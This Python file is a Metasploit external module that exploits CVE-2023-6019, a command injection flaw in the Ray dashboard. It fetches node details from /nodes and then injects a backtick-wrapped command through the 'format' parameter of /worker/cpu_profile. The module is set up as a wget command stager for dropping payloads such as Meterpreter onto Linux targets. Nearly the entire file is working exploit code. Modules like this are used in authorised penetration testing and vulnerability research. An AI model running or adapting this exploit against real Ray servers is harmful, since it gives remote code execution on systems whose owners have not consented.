#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# https://docs.metasploit.com/docs/development/developing-modules/external-modules/writing-external-python-modules.html

# standard modules
import logging

# extra modules
dependencies_missing = False
try:
    import requests
    from requests import Request, Session
except ImportError:
    dependencies_missing = True

from metasploit import module


metadata = {
    'name': 'Ray cpu_profile command injection',
    'description': '''
        Ray RCE via cpu_profile command injection vulnerability.
        The advanced option MeterpreterTryToFork needs to be set to true for this to work.
    ''',
    'authors': [
        'sierrabearchell',
        'byt3bl33d3r <marcello@protectai.com>'
    ],

    'rank': 'excellent',
    'date': '2023-11-15',
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'https://huntr.com/bounties/d0290f3c-b302-4161-89f2-c13bb28b4cfe/'},
        {'type': 'cve', 'ref': 'CVE-2023-6019'}
    ],
    'type': 'remote_exploit_cmd_stager',
    'targets': [
        {'platform': 'linux', 'arch': 'x64' },
        {'platform': 'linux', 'arch': 'x86'},
        {'platform': 'linux', 'arch': 'aarch64'} #'default_options': { 'MeterpreterTryToFork': True} } ??
    ],
    'payload': {
        'command_stager_flavor': 'wget',
    },
    'options': {
        'command': {'type': 'string', 'description': 'The command to execute', 'required': True, 'default': "echo 'Hello from Metasploit'"},
        'rhost': {'type': 'address', 'description': 'Target address', 'required': True, 'default': None},
        'rport': {'type': 'port', 'description': 'Target port (TCP)', 'required': True, 'default': 8265},
        'ssl': {'type': 'bool', 'description': 'Negotiate SSL/TLS for outgoing connections', 'required': True, 'default': False}
    }
}

def convert_args_to_correct_type(args):
    '''
    Utility function to correctly "cast" the modules options to their correct types according to the options.

    When a module is run using msfconsole, the module args are all passed as strings
    so we need to convert them manually. I'd use pydantic but want to avoid extra deps.
    '''

    corrected_args = {}

    for k,v in args.items():
        option_to_convert = metadata['options'].get(k)
        if option_to_convert:
            type_to_convert = metadata['options'][k]['type']
            if type_to_convert == 'bool':
                if isinstance(v, str):
                    if v.lower() == 'false':
                        corrected_args[k] = False
                    elif v.lower() == 'true':
                        corrected_args[k] = True

            if type_to_convert == 'port':
                corrected_args[k] = int(v)

    return {**args, **corrected_args}

def run(args):
    args = convert_args_to_correct_type(args)

    module.LogHandler.setup(msg_prefix=f"{args['rhost']} - ")

    logging.debug(args)
    if dependencies_missing:
        logging.error('Module dependency (requests) is missing, cannot continue')
        return

    base_url = f"{'https' if args['ssl'] else 'http'}://{args['rhost']}:{args['rport']}"
    s = Session()

    try:
        # We need to pass valid node info to /worker/cpu_profile for the server to process the request
        # First we list all nodes and grab the pid and ip of the first one (could be any)
        r = s.get(f"{base_url}/nodes?view=summary")
        r.raise_for_status()

        nodes = r.json()

        first_node = nodes['data']['summary'][0]
        pid = first_node['agent']['pid']
        ip = first_node['ip']

        logging.info(f"Grabbed node info, pid: {pid}, ip: {ip}")

        r = s.get(
            f"{base_url}/worker/cpu_profile",
            params={
                'pid': pid, 
                'ip':  ip,
                'duration': 5,
                'native': 0,
                'format': f"`{args['command']}`"
            }
        )

    except requests.exceptions.HTTPError as e:
        logging.debug(f"{r.status_code} - body length: {len(r.text)}")
        logging.debug(r.text)
        logging.error(str(e))
        return

    logging.info(f"Command execution seems to have been successful. Status code: {r.status_code}")
    logging.debug(r.text)

if __name__ == '__main__':
    module.run(metadata, run)
